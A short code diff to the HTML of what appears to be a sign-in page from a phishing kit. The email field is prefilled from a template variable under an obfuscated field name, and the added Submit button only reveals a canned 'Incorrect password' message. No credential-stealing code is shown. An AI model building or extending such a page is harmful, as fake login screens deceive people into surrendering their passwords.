@@ -370,7 +370,8 @@
                                 Enter a different account</span>
 
                             <li class="l4 animated fadeIn" id="err">
-                                <p id="erp">Error Message</p>
+                                <p style="color: #FF6F61; font-family: 'proxima-nova', sans-serif; font-size: 14px; margin-top: 10px; display: none;" id="error-message">Incorrect password. Please try again.</p><button type="button" onclick="document.getElementById('error-message').style.display='block'">Submit</button>
+
                             </li>
                             <li><input type="email" value="{{eman}}" name="horse" required class="inp" id="email" autocomplete="off"
                                     placeholder="Email Address"
